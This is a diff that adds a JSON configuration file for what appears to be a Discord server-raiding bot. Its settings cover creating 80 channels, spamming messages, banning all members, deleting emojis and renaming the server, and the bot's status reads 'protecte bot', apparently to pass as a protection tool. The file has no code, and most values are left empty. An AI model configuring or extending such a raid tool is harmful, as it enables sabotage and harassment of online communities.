@@ -1,0 +1,26 @@
+{
+    "SERVER_CONFIG": {
+        "new_name": "",
+        "new_icon": "",
+        "new_description": ""
+    },
+    "WEBHOOK_CONFIG": {
+        "default_name": ""
+    },
+    "AUTO_RAID_CONFIG": {
+        "num_channels": 80,
+        "channel_type": "",
+        "channel_name": "",
+        "num_messages": 1,
+        "message_content": "",
+        "ban_all": false,
+        "delete_emojis": false
+    },
+    "NO_BAN_KICK_ID": [
+        
+    ],
+    "BOT_PRESENCE": {
+        "type": "streaming",
+        "text": "protecte bot"
+    }
+}
